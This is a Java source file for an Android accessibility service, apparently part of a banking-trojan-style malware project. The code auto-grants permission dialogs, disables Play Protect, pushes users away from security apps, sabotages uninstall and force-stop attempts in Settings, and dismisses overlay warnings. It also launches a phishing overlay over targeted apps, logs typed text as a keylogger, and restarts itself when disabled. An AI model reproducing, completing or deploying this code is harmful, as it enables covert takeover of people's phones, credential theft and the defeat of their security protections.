package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.AntiAnalysis;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PlayProtectDisabler;
import com.xrc.system.service.CoreService;
import com.xrc.system.ui.OverlayActivity;

import java.util.List;

public class XRCAccessibilityService extends AccessibilityService {
    private static final String TAG = Constants.TAG + ":AccSvc";
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean initialized = false;
    private boolean blocking = false;
    private String lastPackage = "";
    private long lastEventTime = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
                | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
                | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        info.notificationTimeout = 0;
        setServiceInfo(info);
        initialized = true;
        ConfigManager.get(this).setBoolean(Constants.PREF_ACCESSIBILITY, true);
        Log.i(TAG, "Accessibility service connected");
        postInit();
    }

    private void postInit() {
        handler.postDelayed(() -> {
            PermissionHelper.get(this).autoGrantAll();
            PlayProtectDisabler.get(this).disable();
            SelfHealer.get(this).start();
            startService(new Intent(this, CoreService.class));
        }, 500);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!initialized) return;
        long now = System.currentTimeMillis();
        if (now - lastEventTime < 50) return;
        lastEventTime = now;

        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    handleWindowChange(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleClick(event);
                    break;
                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    handleNotification(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextInput(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Event handler error", e);
        }
    }

    private void handleWindowChange(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (pkg.isEmpty() && event.getClassName() != null) {
            pkg = getPackageFromClass(event.getClassName().toString());
        }
        if (pkg.equals(lastPackage)) return;
        lastPackage = pkg;

        if (isSettingsApp(pkg)) {
            handleSettingsEntry(pkg);
        } else if (isSecurityApp(pkg)) {
            blockSecurityApp();
        } else if (isTargetApp(pkg)) {
            triggerPhishlet(pkg);
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            autoClickPermissionDialogs(root);
            dismissOverlayWarning(root);
            root.recycle();
        }
    }

    private void handleSettingsEntry(String pkg) {
        if (pkg.equals("com.android.settings") || pkg.equals("com.android.systemui")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
            List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("Force stop");
            List<AccessibilityNodeInfo> clearDataNodes = root.findAccessibilityNodeInfosByText("Clear data");
            List<AccessibilityNodeInfo> disableNodes = root.findAccessibilityNodeInfosByText("Deactivate");

            if (!uninstallNodes.isEmpty() || !forceStopNodes.isEmpty()
                    || !clearDataNodes.isEmpty() || !disableNodes.isEmpty()) {
                for (AccessibilityNodeInfo n : uninstallNodes) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                for (AccessibilityNodeInfo n : forceStopNodes) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                for (AccessibilityNodeInfo n : clearDataNodes) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                for (AccessibilityNodeInfo n : disableNodes) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                performGlobalAction(GLOBAL_ACTION_HOME);
                handler.postDelayed(() -> relaunchOverlay(), 300);
            }
            root.recycle();
        }
    }

    private void blockSecurityApp() {
        performGlobalAction(GLOBAL_ACTION_HOME);
        handler.postDelayed(() -> {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }, 200);
    }

    private void triggerPhishlet(String pkg) {
        Intent intent = new Intent(this, OverlayActivity.class);
        intent.putExtra("target_pkg", pkg);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
    }

    private void autoClickPermissionDialogs(AccessibilityNodeInfo root) {
        String[] allowTexts = {"Allow", "Allow all the time", "While using the app",
                "Allow only while using the app", "OK", "Grant", "Enable",
                "Turn on", "Activate", "Yes", "Confirm", "Accept"};
        for (String text : allowTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    while (parent != null) {
                        if (parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            break;
                        }
                        parent = parent.getParent();
                    }
                }
            }
        }
    }

    private void dismissOverlayWarning(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Screen overlay detected");
        if (!nodes.isEmpty()) {
            List<AccessibilityNodeInfo> okNodes = root.findAccessibilityNodeInfosByText("OK");
            for (AccessibilityNodeInfo n : okNodes) {
                if (n.isClickable()) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
    }

    private void handleClick(AccessibilityEvent event) {
        AccessibilityNodeInfo node = event.getSource();
        if (node == null) return;
        CharSequence text = node.getText();
        if (text != null) {
            String txt = text.toString().toLowerCase();
            if (txt.contains("deactivate") || txt.contains("remove admin")
                    || txt.contains("uninstall") || txt.contains("force stop")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
                relaunchOverlay();
            }
        }
        node.recycle();
    }

    private void handleNotification(AccessibilityEvent event) {
        if (event.getParcelableData() instanceof android.app.Notification) {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            if (pkg.contains("google") || pkg.contains("play")) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            }
        }
    }

    private void handleTextInput(AccessibilityEvent event) {
        AccessibilityNodeInfo node = event.getSource();
        if (node == null) return;
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            Log.d(TAG + ":Keylog", text.toString());
        }
        node.recycle();
    }

    private void relaunchOverlay() {
        Intent intent = new Intent(this, OverlayActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private boolean isSettingsApp(String pkg) {
        return pkg.contains("settings") || pkg.contains("systemui")
                || pkg.contains("packageinstaller") || pkg.contains("appinfo");
    }

    private boolean isSecurityApp(String pkg) {
        for (String sec : Constants.SECURITY_APPS) {
            if (pkg.equals(sec)) return true;
        }
        return pkg.contains("antivirus") || pkg.contains("security")
                || pkg.contains("malware") || pkg.contains("protect");
    }

    private boolean isTargetApp(String pkg) {
        for (String target : Constants.TARGET_PACKAGES) {
            if (pkg.equals(target)) return true;
        }
        return false;
    }

    private String getPackageFromClass(String className) {
        try {
            PackageManager pm = getPackageManager();
            ActivityInfo info = pm.getActivityInfo(new ComponentName(this, className), 0);
            return info.packageName;
        } catch (Exception e) {
            return "";
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
        handler.postDelayed(this::relaunchOverlay, 1000);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        ConfigManager.get(this).setBoolean(Constants.PREF_ACCESSIBILITY, false);
        handler.postDelayed(() -> {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        }, 500);
        return super.onUnbind(intent);
    }
}
